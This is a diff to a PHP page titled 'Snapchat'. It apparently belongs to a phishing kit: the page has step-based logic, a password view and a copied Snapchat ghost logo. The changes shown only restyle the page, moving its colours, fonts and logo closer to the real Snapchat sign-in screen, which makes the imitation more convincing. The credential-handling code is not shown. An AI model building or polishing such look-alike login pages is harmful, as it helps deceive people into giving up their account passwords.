@@ -50,24 +50,24 @@ if ($step === '1') {
 <title>Snapchat</title>
 <style>
   *{box-sizing:border-box}
-  body{margin:0;background:#FFFC00;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-       display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}
+  body{margin:0;background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+       display:flex;justify-content:center;padding:56px 24px 40px;min-height:100vh}
   .card{width:100%;max-width:360px}
-  .ghost{display:block;margin:0 auto 24px}
-  h1{font-size:19px;font-weight:500;text-align:center;margin:0 0 6px;color:#111}
-  .sub{font-size:12px;color:#555;text-align:center;margin:0 0 22px}
-  input{width:100%;padding:14px;border-radius:10px;border:1px solid #d8d500;background:#fff;
-        color:#111;font-size:15px;margin-bottom:14px;outline:none}
-  input:focus{border-color:#111}
-  button{width:100%;padding:15px;border-radius:26px;border:0;background:#111;color:#fff;
-         font-size:15px;font-weight:500;cursor:pointer}
-  .pill{display:inline-block;font-size:12px;background:#fff;border:1px solid #e3e000;
-        padding:6px 12px;border-radius:20px;margin-bottom:20px;color:#111}
-  .forgot{text-align:center;font-size:12px;color:#666;margin-top:18px}
+  .ghost{display:block;margin:0 auto 28px}
+  h1{font-size:22px;font-weight:600;text-align:center;margin:0 0 8px;color:#000}
+  .sub{font-size:14px;color:#737373;text-align:center;margin:0 0 26px}
+  input{width:100%;padding:14px;border-radius:8px;border:1px solid #d8d8d8;background:#fff;
+        color:#000;font-size:16px;margin-bottom:12px;outline:none}
+  input:focus{border-color:#000}
+  button{width:100%;padding:15px;border-radius:26px;border:0;background:#FFFC00;color:#000;
+         font-size:16px;font-weight:600;cursor:pointer}
+  .pill{display:inline-block;font-size:13px;background:#f5f5f5;border-radius:20px;
+        padding:6px 12px;margin-bottom:18px;color:#000}
+  .forgot{text-align:center;font-size:13px;color:#737373;margin-top:18px}
 </style></head>
 <body>
 <div class="card">
-  <svg class="ghost" width="60" height="60" viewBox="0 0 24 24" fill="#fff" stroke="#000"
+  <svg class="ghost" width="60" height="60" viewBox="0 0 24 24" fill="#FFFC00" stroke="none"
        stroke-width="0.9" stroke-linejoin="round"><path d="M12 2c3.2 0 5.2 2.2 5.2 5.4 0 .9-.1 1.7-.2 2.4.5.2 1 .1 1.4-.1.7-.3 1.3.5.9 1.1-.4.7-1.3 1-2.1 1.1.3.7 1 1.4 1.8 1.9.5.3.3.9-.2 1.1-.9.3-1.7.4-2.2 1.2-.3.5-.8.5-1.4.4-.7-.1-1.4-.2-2.1-.2-1 0-1.6.3-2.2.7-.6.4-1.2.7-2 .5-.7-.2-1.1-.7-1.4-1.2-.4-.8-1.2-.9-2.1-1.2-.5-.2-.7-.8-.2-1.1.8-.5 1.5-1.2 1.8-1.9-.8-.1-1.7-.4-2.1-1.1-.4-.6.2-1.4.9-1.1.4.2.9.3 1.4.1-.1-.7-.2-1.5-.2-2.4C6.8 4.2 8.8 2 12 2z"/></svg>
 
   <?php if ($view === 'pw'): ?>
